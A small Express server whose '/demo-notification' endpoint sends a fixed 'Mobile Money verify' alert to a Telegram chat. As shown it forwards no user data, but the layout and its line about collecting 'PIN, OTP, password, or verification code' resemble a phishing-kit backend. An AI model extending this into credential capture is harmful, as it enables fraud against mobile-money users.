const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(__dirname));

app.post("/demo-notification", async (req, res) => {
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return res.status(500).json({ error: "Telegram is not configured." });
    }

    const message =
      "🧪 Mobile Money verify\n\n" +
      "A demo verification was submitted.\n" +
      "collect PIN, OTP, password, or verification code.";

    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );

    if (!response.ok) {
      return res.status(502).json({ error: "Telegram notification failed." });
    }

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Server error." });
  }
});


app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
